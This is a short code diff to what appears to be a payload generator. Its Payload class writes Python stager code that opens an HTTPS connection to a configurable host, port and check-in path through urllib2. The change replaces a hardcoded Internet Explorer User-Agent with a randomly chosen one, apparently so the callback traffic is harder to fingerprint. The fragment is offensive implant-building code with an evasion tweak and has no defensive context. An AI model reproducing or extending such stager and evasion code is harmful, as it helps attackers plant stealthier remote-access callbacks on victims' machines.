@@ -69,7 +69,7 @@ class Payload:
         payloadCode += "\t" + proxy_var + " = urllib2.ProxyHandler()\n"
         payloadCode += "\t" + opener_var + " = urllib2.build_opener(" + proxy_var + ")\n"
         payloadCode += "\turllib2.install_opener(" + opener_var + ")\n"
-        payloadCode += "\t%s = urllib2.Request(\"https://%%s:%%s/%%s\" %%(%s,%s,%s()), None, {'User-Agent' : 'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)'})\n" %(requestName, hostName, portName, checkinMethodName)
+        payloadCode += "\t%s = urllib2.Request(\"https://%%s:%%s/%%s\" %%(%s,%s,%s()), None, {'User-Agent' : '%s'})\n" %(requestName, hostName, portName, checkinMethodName, helpers.randomUserAgent())
         payloadCode += "\ttry:\n"
         payloadCode += "\t\t%s = urllib2.urlopen(%s)\n" %(tName, requestName)
         payloadCode += "\t\ttry:\n"
